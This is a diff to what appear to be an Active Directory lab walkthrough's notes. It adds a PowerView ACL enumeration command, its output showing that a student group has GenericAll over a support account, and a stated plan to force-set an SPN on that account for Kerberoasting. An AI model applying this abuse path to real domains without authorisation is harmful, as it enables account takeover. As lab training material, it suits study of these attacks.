@@ -48,3 +48,21 @@ winrs -r:us-mgmt cmd
 $usmgmt = New-PSSession us-mgmt
 Enter-PSSession $usmgmt
 ```
+***studentuserX has GenericAll rights on the supportXuser, let’s force set a SPN on it***
+
+```
+Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match "StudentUsers"}
+
+ObjectDN                : CN=Support147User,CN=Users,DC=us,DC=techcorp,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1116
+IdentityReferenceName   : studentusers
+IdentityReferenceDomain : us.techcorp.local
+IdentityReferenceDN     : CN=StudentUsers,CN=Users,DC=us,DC=techcorp,DC=local
+IdentityReferenceClass  : group
+```
